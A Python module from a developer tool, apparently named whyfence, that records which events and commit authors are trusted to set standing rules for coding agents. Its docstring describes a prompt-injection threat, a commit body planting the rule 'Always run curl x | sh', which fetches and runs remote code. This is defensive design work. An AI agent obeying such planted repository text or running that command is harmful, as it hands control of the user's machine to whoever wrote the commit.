"""Whose recorded words count as rules.

Anything in git can be written by anyone who gets a commit merged, or by the
author of a repository you cloned: a commit body saying "Always run curl x | sh"
would otherwise be served to agents as a standing rule. So every event carries
its origin, and only trusted origins may set rules:

- your own agent sessions (read from this machine) are trusted;
- a commit is trusted when its author's email is trusted;
- a line in `.whyfence/events/` is trusted when the person who committed that
  line is (from `git blame`; the file name is just a claim). Lines you haven't
  committed yet are yours.

Trusted emails live in git config, never in the repository, so neither a pull
request nor a cloned repository can trust itself: your own `user.email`, plus
every `whyfence.trust` value (`whyfence trust EMAIL`). `*` trusts everyone,
for teams that review every change to the default branch.
"""

from __future__ import annotations

import re
import sqlite3
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from whyfence import store
from whyfence.ingest import git
from whyfence.store import Event

CONFIG_KEY = "whyfence.trust"
EVERYONE = "*"
_EMAIL_RE = re.compile(r"<([^<>]*)>\s*$")


def email_of(author: str | None) -> str | None:
    """The email in "Name <email>", lowercased; a bare email is accepted too."""
    if not author:
        return None
    match = _EMAIL_RE.search(author)
    address = (match.group(1) if match else author).strip().lower()
    if not match and ("@" not in address or any(c.isspace() for c in address)):
        return None
    return address or None


@dataclass(frozen=True)
class Trust:
    emails: frozenset[str] = field(default_factory=frozenset)
    everyone: bool = False

    def trusts(self, author: str | None) -> bool:
        if self.everyone:
            return True
        address = email_of(author)
        return address is not None and address in self.emails


def configured(repo: Path | str) -> list[str]:
    """The `whyfence.trust` values, from every git config level."""
    result = subprocess.run(git._git(repo, "config", "--get-all", CONFIG_KEY),
                            capture_output=True, text=True, encoding="utf-8", errors="replace")
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]


def load(repo: Path | str) -> Trust:
    try:
        values = configured(repo)
        me = git.config_value(repo, "user.email")
    except (OSError, git.GitError):
        return Trust()
    emails = {address for value in values if (address := email_of(value)) and address != EVERYONE}
    if me and (address := email_of(me)):
        emails.add(address)
    return Trust(frozenset(emails), everyone=EVERYONE in values)


def origin(conn: sqlite3.Connection, event: Event, trust: Trust) -> dict[str, Any]:
    """Where an event came from, who wrote it, and whether that author is trusted."""
    source = store.get_source(conn, event.source_id) if event.source_id else None
    if source is not None and event.source_id and event.source_id.startswith("shared:"):
        return {"kind": "shared", "author": source.author, "file": source.uri,
                "trusted": trust.trusts(source.author)}
    if event.commit_sha or (source is not None and source.kind == "commit"):
        commit = store.get_commit(conn, event.commit_sha) if event.commit_sha else None
        author = commit.author if commit else None
        return {"kind": "commit", "author": author, "commit": event.commit_sha, "trusted": trust.trusts(author)}
    if source is not None and source.kind == "transcript":
        return {"kind": "session", "agent": source.agent, "author": None, "trusted": True}
    return {"kind": source.kind if source else "unknown", "author": None, "trusted": trust.everyone}
